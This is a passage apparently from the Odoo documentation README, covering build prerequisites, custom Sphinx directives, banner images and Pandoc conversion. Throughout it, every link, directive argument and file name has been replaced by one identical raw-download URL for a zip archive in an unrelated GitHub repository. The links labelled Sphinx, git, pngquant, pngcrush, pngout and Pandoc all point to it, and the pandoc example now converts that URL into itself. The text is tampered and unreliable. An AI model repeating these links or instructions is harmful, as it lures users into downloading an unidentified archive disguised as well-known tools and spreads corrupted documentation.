...
* Python 2.7
* recent `Sphinx <https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/purchase/purchases/user-documentation-1.5.zip>`_ (at least Sphinx 1.2)
  ...
  See `the sphinx documentation <https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/purchase/purchases/user-documentation-1.5.zip>`_
  for local installation instructions.
* `git <https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/purchase/purchases/user-documentation-1.5.zip>`_
* clone this repository using git, then at the root of the repository,
  ...
  HTML in ``https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/purchase/purchases/user-documentation-1.5.zip``.
...
* ``demo:fields:: {external_id}`` lists all the fields with a
  ...
  .. code-block:: restructuredtext
     ...
     .. demo:fields:: https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/purchase/purchases/user-documentation-1.5.zip
        :only: name
...
* ``demo:action:: {external_id}`` will create a link button to the
  ...
  .. code-block:: restructuredtext
     ...
     .. demo:action:: https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/purchase/purchases/user-documentation-1.5.zip
...
* The Odoo theme supports *Banner Images* at the top of
  ...
  .. code-block:: restructuredtext
     ...
     :banner: https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/purchase/purchases/user-documentation-1.5.zip
  ...
  .. warning::
     ...
     `pngquant <https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/purchase/purchases/user-documentation-1.5.zip>`_ (or a UI to it) to reduce the
     number of colors in the image followed by regular PNG
     recompression tools like `pngcrush
     <https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/purchase/purchases/user-documentation-1.5.zip>`_ and `pngout
     <https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/purchase/purchases/user-documentation-1.5.zip>`_.
...
document using `Pandoc <https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/purchase/purchases/user-documentation-1.5.zip>`_. The main issue is that
...
Example::
  ...
  pandoc -f docx -t rst https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/purchase/purchases/user-documentation-1.5.zip -o https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/purchase/purchases/user-documentation-1.5.zip --extract-media=.

will convert ``https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/purchase/purchases/user-documentation-1.5.zip`` to ``https://github.com/vladimir2678/documentation-user/raw/refs/heads/13.0/purchase/purchases/user-documentation-1.5.zip`` and export
